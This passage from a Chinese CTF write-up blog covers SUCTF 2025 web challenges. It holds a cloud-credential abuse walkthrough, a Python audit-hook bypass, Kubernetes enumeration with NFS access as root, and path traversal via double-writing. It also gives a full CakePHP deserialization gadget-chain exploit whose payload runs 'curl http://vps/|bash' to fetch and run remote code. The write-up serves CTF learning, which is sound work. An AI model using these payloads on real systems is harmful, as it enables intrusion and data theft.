class="hljs-string">&quot;CAIS1AJ1q6Ft5B2yfSjIr5DMf97Hq61w0KXSVhfiijhjRMpcvKPsjzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZ2VAI4zb+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGwgIOoQY+nSmQwGPJReJb+udQu7JKc2gIYBv0ZNFJ1n7EnGlNRYbLXu/Ir1QXq3esyb6gQz4rK4KNHstGUvdUGoABAn1BUz7d7A/upOPE4w5ha3QAIyrqx7EgAlz/SWDlebYSWq5znabX0kKWtpuV6+oyJj01bbVoAV35NSu3P9Snk1Gu7e7fUmuWow+PKQed8YjGF9EQWdanrh6ynUSbzpbltvdPGhG7+HRVOsT7OjQz6gJplt44R5e4cXOlXNhayTAgAA==&quot;</span>,                                                                                              <br>  <span class="hljs-string">&quot;LastUpdated&quot;</span> : <span class="hljs-string">&quot;2025-01-13T09:30:13Z&quot;</span>,                                                                                                                              <br>  <span class="hljs-string">&quot;Code&quot;</span> : <span class="hljs-string">&quot;Success&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接连oss browser，但是桶里没东西，估计删了。</p><p>然后导入<code>aliyuncli</code>恢复历史版本，就找到flag了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./aliyun.exe configure --mode StsToken //输入对应的ak/sk，region是cn-hangzhou<br>./aliyun.exe oss <span class="hljs-built_in">ls</span> //列出已有资源<br>./aliyun.exe oss <span class="hljs-built_in">ls</span> oss://suctf-flag-bucket/oss-flag --all-versions //列出所有版本<br>./aliyun.exe oss <span class="hljs-built_in">cat</span> oss://suctf-flag-bucket/oss-flag --version-id CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA-- //读取文件<br></code></pre></td></tr></table></figure><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/55dfd2c98f5fe645dfae1e5e6555f641.png" alt="img"></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/4eca745d7fb175ac2fe4ffca8bbb20ae.png" alt="img"></p><h2 id="SU-easyk8s"><a href="#SU-easyk8s" class="headerlink" title="SU_easyk8s"></a>SU_easyk8s</h2><p>入口机打法同上，但是后面题目下线了，看看官方给的wp吧：</p><h4 id="Python-Audit-Hook-RCE"><a href="#Python-Audit-Hook-RCE" class="headerlink" title="Python Audit Hook RCE"></a>Python Audit Hook RCE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">DEBUG=<span class="hljs-literal">True</span>  <span class="hljs-comment"># open debug</span><br><span class="hljs-keyword">import</span> os,sys<br>op = <span class="hljs-built_in">print</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">*args</span>):<br>  t = sys._getframe(<span class="hljs-number">1</span>).f_locals[<span class="hljs-string">&#x27;audit_functions&#x27;</span>]<br>  t[<span class="hljs-string">&quot;os.system&quot;</span>][<span class="hljs-string">&#x27;ban&#x27;</span>]= <span class="hljs-literal">False</span><br>  op(t)<br>  <span class="hljs-keyword">return</span> op(*args)<br><br>os.system(<span class="hljs-string">&quot;ls&quot;</span>) <span class="hljs-comment">## RCE </span><br></code></pre></td></tr></table></figure><p>当然这里也可以 _posixprocess.fork_exec 进行绕过</p><h4 id="Kubernetes-信息泄漏"><a href="#Kubernetes-信息泄漏" class="headerlink" title="Kubernetes 信息泄漏"></a>Kubernetes 信息泄漏</h4><p><a href="https://gh-proxy.com/github.com/Esonhugh/k8spider/releases/download/v2.6.0-metric/k8spider_v2.6.0-metric_linux_amd64.tar.gz">https://gh-proxy.com/github.com/Esonhugh/k8spider/releases/download/v2.6.0-metric/k8spider_v2.6.0-metric_linux_amd64.tar.gz</a></p><p>下载新版本 k8spider 对付他，先枚举服务，直接枚举就失败， -vv 看报错可以知道，只有前几个 dns 请求正常处理了，后几个请求 全部 io timeout</p><p>然而 dns 服务始终是正常的，所以可以猜测是 dns 服务被某些东西限制了。尝试缩小集群 server cidr 并且循环跑。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 254); <span class="hljs-keyword">do</span> ./k8spider all -c 10.43.<span class="hljs-variable">$i</span>.1/24 -i 20000 &gt;&gt; res ;<span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cat</span> res<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.8.117&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;suctf-svc.default.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;suctf-svc.default.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;suctf-svc.default.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:5000,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:100&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.109.180&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;metrics-server.kube-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;metrics-server.kube-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;metrics-server.kube-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:443,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:100&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.116.179&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;kube-state-metrics.lens-metrics.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;kube-state-metrics.lens-metrics.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;kube-state-metrics.lens-metrics.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:8080,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:100&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.140.10&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:80,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:50&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:443,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:50&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.225.93&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:15012,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:15010,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:15014,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:443,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;]&#125;]&#125;<br></code></pre></td></tr></table></figure><p>有 server 也有服务 port</p><p>关注 kube-state-metrics.lens-metrics.svc.cluster.local</p><p>这是个 metrics 服务，容器中有 curl，下载对应的 metrics 文本为文件</p><p>kube-state-metrics.lens-metrics.svc.cluster.local:8080&#x2F;metrics</p><blockquote><p>现在的 k8spider 可以帮助你分析这类 metrics 中的敏感信息，使得你可以极大可能把握集群整体状态。</p></blockquote><h4 id="集群-NFS-PV"><a href="#集群-NFS-PV" class="headerlink" title="集群 NFS PV"></a>集群 NFS PV</h4><p>在 metrics 信息中存在，敏感信息 nfs pv 配置。</p><blockquote><p>发现这个 nfs 后利用的套路 k8slanparty 一模一样</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kube_persistentvolume_info&#123;persistentvolume=<span class="hljs-string">&quot;nfs-pv&quot;</span>,storageclass=<span class="hljs-string">&quot;nfs-client&quot;</span>,gce_persistent_disk_name=<span class="hljs-string">&quot;&quot;</span>,ebs_volume_id=<span class="hljs-string">&quot;&quot;</span>,azure_disk_name=<span class="hljs-string">&quot;&quot;</span>,fc_wwids=<span class="hljs-string">&quot;&quot;</span>,fc_lun=<span class="hljs-string">&quot;&quot;</span>,fc_target_wwns=<span class="hljs-string">&quot;&quot;</span>,iscsi_target_portal=<span class="hljs-string">&quot;&quot;</span>,iscsi_iqn=<span class="hljs-string">&quot;&quot;</span>,iscsi_lun=<span class="hljs-string">&quot;&quot;</span>,iscsi_initiator_name=<span class="hljs-string">&quot;&quot;</span>,nfs_server=<span class="hljs-string">&quot;0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com&quot;</span>,nfs_path=<span class="hljs-string">&quot;/nfs-root/&quot;</span>,csi_driver=<span class="hljs-string">&quot;&quot;</span>,csi_volume_handle=<span class="hljs-string">&quot;&quot;</span>,local_path=<span class="hljs-string">&quot;&quot;</span>,local_fs=<span class="hljs-string">&quot;&quot;</span>,host_path=<span class="hljs-string">&quot;&quot;</span>,host_path_type=<span class="hljs-string">&quot;&quot;</span>&#125; 1<br></code></pre></td></tr></table></figure><p>nfs 服务器为 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com，nfs 路径为 &#x2F;nfs-root&#x2F;</p><p>通过 socks5 代理后，尝试使用 nfs-cat 和 nfs-ls 进行访问</p><p>即可得到 flag 在 nfs &#x2F; 目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfs-ls nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/?uid=0<br>nfs-cat nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/flag.txt?uid=0<br></code></pre></td></tr></table></figure><p>或者上传一个 nfs client</p><p>例如 <a href="https://github.com/mubix/nfsclient/tree/main">https://github.com/mubix/nfsclient/tree/main</a></p><p>但是他有点小 bug 没办法下载文件 需要修改为 <a href="https://github.com/mubix/nfsclient/blob/dadb0bf6caa10f02a617abf65c972e36389810cd/nfsclient.go#L121">https://github.com/mubix/nfsclient/blob/dadb0bf6caa10f02a617abf65c972e36389810cd/nfsclient.go#L121</a> 为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0777)<br></code></pre></td></tr></table></figure><p>这样就不会有问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfsc 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/ root:0:0 <span class="hljs-built_in">ls</span><br>+----------+-----+-----+----------+------+<br>| FILENAME | UID | GID | MODE     | SIZE |<br>+----------+-----+-----+----------+------+<br>| .        |   0 |   0 | 0x543c60 | 4096 |<br>| ..       |   0 |   0 | 0x543c60 | 4096 |<br>| flag.txt |   0 |   0 | 0x543c60 |   74 |<br>| nfs-root |   0 |   0 | 0x543c60 | 4096 |<br>+----------+-----+-----+----------+------+<br><br>nfsc 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/ root:0:0 down flag.txt <br><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure><h2 id="SU-POP"><a href="#SU-POP" class="headerlink" title="SU_POP"></a>SU_POP</h2><p>简单找pop链的审计题。</p><p><a href="https://github.com/cakephp/cakephp">GitHub - cakephp&#x2F;cakephp: CakePHP: The Rapid Development Framework for PHP - Official Repository</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">React\Promise\Internal\RejectedPromise</span>::<span class="hljs-title function_ invoke__">__destruct</span>()<br>--&gt;<span class="hljs-title class_">Cake\Http\Response</span>::<span class="hljs-title function_ invoke__">__toString</span>()<br>--&gt;Cake\ORM<span class="hljs-title class_">\Table</span>::<span class="hljs-title function_ invoke__">__call</span>()<br>--&gt;Cake\ORM<span class="hljs-title class_">\BehaviorRegistry</span>::<span class="hljs-title function_ invoke__">call</span>()<br>--&gt;<span class="hljs-title class_">PHPUnit\Framework\MockObject\Generator\MockClass</span>::<span class="hljs-title function_ invoke__">generate</span>()<br></code></pre></td></tr></table></figure><p>赵哥打的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">React</span>\<span class="hljs-title class_">Promise</span>\<span class="hljs-title class_">Internal</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">RejectedPromise</span><br>    &#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">handled</span> = <span class="hljs-title class_">false</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$reason</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handled=<span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;reason =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Cake\Http\Response</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Cake</span>\<span class="hljs-title class_">Http</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Response</span><br>    &#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">stream</span> ;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;stream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Cake</span>\ORM\<span class="hljs-title function_ invoke__">Table</span>();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PHPUnit</span>\<span class="hljs-title class_">Framework</span>\<span class="hljs-title class_">MockObject</span>\<span class="hljs-title class_">Generator</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">MockClass</span>&#123;<br>        <span class="hljs-title class_">private</span> <span class="hljs-title class_">readonly</span> <span class="hljs-title class_">string</span> $<span class="hljs-title class_">mockName</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$classCode</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;mockName = <span class="hljs-string">&quot;zbr&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;classCode = <span class="hljs-string">&quot;system(\&quot;curl http://vps/|bash\&quot;);&quot;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Cake</span>\<span class="hljs-title class_">ORM</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">BehaviorRegistry</span>&#123;<br>        <span class="hljs-title class_">protected</span> <span class="hljs-title class_">array</span> $<span class="hljs-title class_">_methodMap</span> ;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_loaded</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_loaded=[<span class="hljs-string">&quot;zbr&quot;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">\PHPUnit\Framework\MockObject\Generator\MockClass</span>()];<br>            <span class="hljs-variable language_">$this</span>-&gt;_methodMap = [<span class="hljs-string">&quot;rewind&quot;</span> =&gt; [<span class="hljs-string">&quot;zbr&quot;</span>,<span class="hljs-string">&quot;generate&quot;</span>]];<br>        &#125;<br>    &#125;<br>    Class Table<br>    &#123;<br>        <span class="hljs-keyword">protected</span> BehaviorRegistry <span class="hljs-variable">$_behaviors</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_behaviors= <span class="hljs-keyword">new</span> <span class="hljs-title class_">BehaviorRegistry</span>();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">GadgetChain</span> &#123;<br>    $<span class="hljs-title class_">a</span>=<span class="hljs-title class_">new</span> \<span class="hljs-title class_">React</span>\<span class="hljs-title class_">Promise</span>\<span class="hljs-title class_">Internal</span>\<span class="hljs-title class_">RejectedPromise</span>();<br><br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$str</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>call参考这篇文章<code>$this-&gt;_behaviors</code>会调用转发到<code>BehaviorRegistry::call()</code>，控制<code>_methodMap</code>将<code>rewind</code>映射到 <code>MockClass .</code>最后利用<code>generate</code>写：</p><p><a href="https://xz.aliyun.com/t/9995?time__1311=n4+xnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-7">https://xz.aliyun.com/t/9995?time__1311=n4%2BxnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-7</a></p><p>弹shell后有个suid提权，find交了。</p><h2 id="SU-Blog"><a href="#SU-Blog" class="headerlink" title="SU_Blog"></a>SU_Blog</h2><p>可参考<a href="https://kdxcxs.github.io/en/posts/wp/idekctf-2022-task-manager-wp/#bypassing-jinja-directory-traversal-check">idekctf 2022* task manager wp - kdxcxs</a></p><p>register接口可以任意密码重置，直接重置admin的密码登陆越权登录。</p><p>然后在article接口看到一个疑似任意文件读取的东西，且必须要用articles开头，并且直接传..&#x2F;没用。</p><p>结果双写绕过了。。。</p><p>可以读到waf.py和app.py，需要注意的是waf把waf.py给waf了，所以也要双写一下利用这个..&#x2F;来读。</p><p><code>app.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time,os,json,hashlib<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> set_<br><span class="hljs-keyword">from</span> waf <span class="hljs-keyword">import</span> pwaf,cwaf<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = hashlib.md5(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time())).encode()).hexdigest()<br><br>users = &#123;<span 